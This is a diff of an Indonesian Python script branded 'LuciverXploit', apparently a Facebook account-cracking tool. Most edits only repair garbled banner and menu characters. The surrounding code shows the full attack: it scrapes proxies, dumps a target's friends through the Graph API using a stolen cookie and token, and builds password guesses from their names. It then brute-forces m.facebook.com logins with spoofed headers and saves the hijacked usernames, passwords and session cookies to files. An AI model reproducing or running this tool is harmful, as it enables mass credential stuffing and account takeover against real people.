@@ -16,17 +16,17 @@ from rich.text import Text as tekz
 try:
         import rich
 except ImportError:
-        cetak(nel('\tâ€¢ Sedang Menginstall Modul Rich â€¢'))
+        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
         os.system('pip install rich')
 try:
         import stdiomask
 except ImportError:
-        cetak(nel('\tâ€¢ Sedang Menginstall Modul Stdiomask â€¢'))
+        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
         os.system('pip install stdiomask')
 try:
 	import requests
 except ImportError:
-	cetak(nel('\tâ€¢ Sedang Menginstall Modul Requests â€¢'))
+	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
 	os.system('pip install requests && pip install mechanize ')
 
 pretty.install()
@@ -40,7 +40,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mLuciverXploit')
+	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mLuciverXploit')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(1000):
    rr = random.randint; rc = random.choice
@@ -102,15 +102,15 @@ def clear():
 def back():
 	login()
 def ler():
-	print(f'\x1b[1;97mâ”€â”€â”€â”€â”€â”€[ {h}Menu Crack\x1b[1;97m]â”€â”€â”€â”€â”€â”€')
+	print(f'\x1b[1;97m──────[ {h}Menu Crack\x1b[1;97m]──────')
 def upin():
-	print(f'\x1b[1;97mâ”€â”€â”€â”€â”€â”€[ {h}Urutan Crack \x1b[1;97m]â”€â”€â”€â”€â”€â”€')
+	print(f'\x1b[1;97m──────[ {h}Urutan Crack \x1b[1;97m]──────')
 def ipin():
-	print(f'\x1b[1;97mâ”€â”€â”€â”€â”€â”€[ {h}Methode Crack \x1b[1;97m]â”€â”€â”€â”€â”€â”€')
+	print(f'\x1b[1;97m──────[ {h}Methode Crack \x1b[1;97m]──────')
 
 def banner():
 	clear()
-	luciver_xp(f'''\x1b[1;92m â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n \x1b[1;92mâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â–ˆ         \x1b[1;97mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬à¹‘Û©Û©à¹‘â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\n \x1b[1;92mâ–ˆ \x1b[1;93mâ–¼â–¼â–¼â–¼â–¼  \x1b[1;97m- _ --_-- \x1b[1;92mâ•”â•¦â•—â”Œâ”€â”â”¬â”€â”â”¬â”Œâ”€   â•”â•â•—â•”â•— \n \x1b[1;92mâ–ˆ  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m â•‘â•‘â”œâ”€â”¤â”œâ”¬â”˜â”œâ”´â”â”€â”€â”€â• â•£ â• â•©â•—\n \x1b[1;92mâ–ˆ \x1b[1;93mâ–²â–²â–²â–²â–² \x1b[1;97m--  - _ -- \x1b[1;92mâ•â•©â•â”´ â”´â”´â””â”€â”´ â”´   â•š  â•šâ•â•  \x1b[1;93m2024 Spesial\n \x1b[1;92mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ         \x1b[1;97mÂ«==========âœ§==========Â»\n \x1b[1;92m â–ˆâ–ˆ â–ˆâ–ˆ\n \x1b[1;97mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n \x1b[1;97mâ•‘ \x1b[1;93m*  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;96m Luciver Xploit  \x1b[1;97m               â•‘\n \x1b[1;97mâ•‘ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/LuciverXp\x1b[    \x1b[1;97m â•‘\n \x1b[1;97mâ•‘ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/LuciverTrojans\x1b[\x1b[1;97m   â•‘   \n \x1b[1;97mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"  '\n\x1b[1;92m[â€¢] Aku Adalah Luciver Xploit Yang Ganteng\n''')              
+	luciver_xp(f'''\x1b[1;92m █████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93m2024 Spesial\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;96m Luciver Xploit  \x1b[1;97m               ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/LuciverXp\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/LuciverTrojans\x1b[\x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[•] Aku Adalah Luciver Xploit Yang Ganteng\n''')              
 
 def login():
 	os.system('clear')
@@ -150,18 +150,18 @@ def menu():
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	print(f'\x1b[1;97mâ”Œâ”€Nama  : {h}%s'%(nama))
-	print(f'\x1b[1;97mâ”œâ”€Idz   :{h} '+str(uidfb))
-	print(f'\x1b[1;97mâ”œâ”€Ip    :{h} {ip}\x1b[1;97m')
-	print(f'â””â”€\x1b[1;97mAuthor\x1b[1;97m: [{h}LuciverXploit\x1b[1;97m] ')
+	print(f'\x1b[1;97m┌─Nama  : {h}%s'%(nama))
+	print(f'\x1b[1;97m├─Idz   :{h} '+str(uidfb))
+	print(f'\x1b[1;97m├─Ip    :{h} {ip}\x1b[1;97m')
+	print(f'└─\x1b[1;97mAuthor\x1b[1;97m: [{h}LuciverXploit\x1b[1;97m] ')
 	print('')
 	ler()
-	print(f'â”Œâ”€[{h}1\x1b[1;97m] Super Multi Bruteforce Facebook ')
-	print(f'\x1b[1;97mâ”œâ”€[{h}2\x1b[1;97m] Crack Hasil Eror')
-	print(f'\x1b[1;97mâ””â”€[{h}0\x1b[1;97m] Back       ')
-	_____luciver__xploit_____ = input(f'\nâ””â”€â”€â”€âž¢ Pilih : ')
+	print(f'┌─[{h}1\x1b[1;97m] Super Multi Bruteforce Facebook ')
+	print(f'\x1b[1;97m├─[{h}2\x1b[1;97m] Crack Hasil Eror')
+	print(f'\x1b[1;97m└─[{h}0\x1b[1;97m] Back       ')
+	_____luciver__xploit_____ = input(f'\n└───➢ Pilih : ')
 	if _____luciver__xploit_____ in ['1']:
-	        idt = input('\nâ”Œâ”€âž¢ ID Target : ')
+	        idt = input('\n┌─➢ ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        setting()
 	elif _____luciver__xploit_____ in ['6']:
@@ -177,13 +177,13 @@ def menu():
 	elif _____luciver__xploit_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('âž¢ Sukses Logout+Hapus Kukis ')
+		print('➢ Sukses Logout+Hapus Kukis ')
 		back()
 	else:
-		print('âž¢ Pilih Yang Bener Asu ')
+		print('➢ Pilih Yang Bener Asu ')
 		back()
 def error():
-	print(f'{k}âž¢ Maaf Fitur Ini Masih Di Perbaiki {x}')
+	print(f'{k}➢ Maaf Fitur Ini Masih Di Perbaiki {x}')
 	time.sleep(4)
 	exit()
 
@@ -215,7 +215,7 @@ def dump(idt,fields,cookie,token):
 		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
 		for i in url["friends"]["data"]:
 			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\râ””â”€ Dump : {H}{len(id)}{P} id....{P}"),
+			sys.stdout.write(f"\r└─ Dump : {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
@@ -226,10 +226,10 @@ def setting():
 	banner()
 	print('')
 	upin()
-	print(f'â”Œâ”€[{h}1\x1b[1;97m] Akun Old ')
-	print(f'\x1b[1;97mâ”œâ”€[{h}2\x1b[1;97m] Akun New ')
-	print(f'\x1b[1;97mâ”œâ”€[{h}3\x1b[1;97m] Akun Random ')
-	hu = input(f'\x1b[1;97mâ””â”€Pilih : ')
+	print(f'┌─[{h}1\x1b[1;97m] Akun Old ')
+	print(f'\x1b[1;97m├─[{h}2\x1b[1;97m] Akun New ')
+	print(f'\x1b[1;97m├─[{h}3\x1b[1;97m] Akun Random ')
+	hu = input(f'\x1b[1;97m└─Pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -248,27 +248,27 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(f'[{h}â€¢\x1b[1;97m]Pilih Yang Bener Kontooll ')
+		print(f'[{h}•\x1b[1;97m]Pilih Yang Bener Kontooll ')
 		exit()
 	os.system('clear')
 	banner()
 	print('')
 	ipin()
-	print(f'â”Œâ”€[{h}1\x1b[1;97m] Mobile ')
-	hc = input(f'\x1b[1;97mâ””â”€Pilih : ')
+	print(f'┌─[{h}1\x1b[1;97m] Mobile ')
+	hc = input(f'\x1b[1;97m└─Pilih : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		print('[{h}â€¢\x1b[1;97m]Pilih Yang Bener Kontooll  ')
+		print('[{h}•\x1b[1;97m]Pilih Yang Bener Kontooll  ')
 		setting()
 	else:
 		method.append('mobile')
 	print('')
-	pwplus=input(f'â”Œâ”€Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input(f'┌─Tambahkan Password Manual ( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		cetak(nel('[[cyan]â€¢[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]â€¢[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('â””â”€Masukkan Password Tambahan : ')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('└─Masukkan Password Tambahan : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -279,9 +279,9 @@ def setting():
 def passwrd():
 	os.system('clear')
 	banner()
-	print(f'\r {h}  âž¢â— {N}Bismillah Dulu Sayang')
-	print(f' {N}    â”Œâ”€{h}â— {h}OK/%s '%(okc))
-	print(f' {N}    â””â”€{h}â— {k}CP/%s '%(cpc))
+	print(f'\r {h}  ➢● {N}Bismillah Dulu Sayang')
+	print(f' {N}    ┌─{h}● {h}OK/%s '%(okc))
+	print(f' {N}    └─{h}● {k}CP/%s '%(cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -325,15 +325,15 @@ def passwrd():
 			else:
 				pool.submit(crack,idf,pwv)
 	print('')
-	print(f'{N}â”Œâ”€{h}â— {N}Crack Selesai')	
-	print(f'{N}â”œâ”€{h}â— {N}OK : {h}%s '%(ok))
-	print(f'{N}â””â”€{h}â— {N}CP : {k}%s{x} '%(cp))
-	print(f'\x1b[1;97mâ”Œâ”€Lanjut Crack Kembali ( {h}Y\x1b[1;97m/{m}t\x1b[1;97m ) ? ')
-	woi = input('â””â”€Pilih : ')
+	print(f'{N}┌─{h}● {N}Crack Selesai')	
+	print(f'{N}├─{h}● {N}OK : {h}%s '%(ok))
+	print(f'{N}└─{h}● {N}CP : {k}%s{x} '%(cp))
+	print(f'\x1b[1;97m┌─Lanjut Crack Kembali ( {h}Y\x1b[1;97m/{m}t\x1b[1;97m ) ? ')
+	woi = input('└─Pilih : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\r {h}  âž¢â— {N}Dadah Sayang')
+		print(f'\r {h}  ➢● {N}Dadah Sayang')
 		time.sleep(2)
 		exit()
 
@@ -371,10 +371,10 @@ def crack(idf,pwv):
 			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v8.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'RW01gY2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqVi0LMUgCHNzLdLS+5lvlLnRgplESoVeUHKj4pMGYJWZrDACA==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
 			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=290293790992170&auth_token=42daecc7930acde214740b8da04f49d4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&refsrc=deprecated&app_id=290293790992170&cancel=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{K}â”Œâ”€âž¢â—CHECKPOINT')
-				print(f'\râ”Œâ”€ {P}Username : {K}{idf}{N}')
-				print(f'\râ”œâ”€ {P}Password  : {K}{pw}{N}')
-				print(f'\râ””â”€ {P}UserAgent  : {K}{ua}{N}')
+				print(f'\r{K}┌─➢●CHECKPOINT')
+				print(f'\r┌─ {P}Username : {K}{idf}{N}')
+				print(f'\r├─ {P}Password  : {K}{pw}{N}')
+				print(f'\r└─ {P}UserAgent  : {K}{ua}{N}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -383,10 +383,10 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{K}â”Œâ”€âž¢â—SUKSES LOGIN')
-				print(f'\râ”Œâ”€ {P}Username : {H}{idf}{N}')
-				print(f'\râ”œâ”€ {P}Password  : {H}{pw}{N}')
-				print(f'\râ””â”€ {P}Cookies     : {H}{kuki}{N}')
+				print(f'\r{K}┌─➢●SUKSES LOGIN')
+				print(f'\r┌─ {P}Username : {H}{idf}{N}')
+				print(f'\r├─ {P}Password  : {H}{pw}{N}')
+				print(f'\r└─ {P}Cookies     : {H}{kuki}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
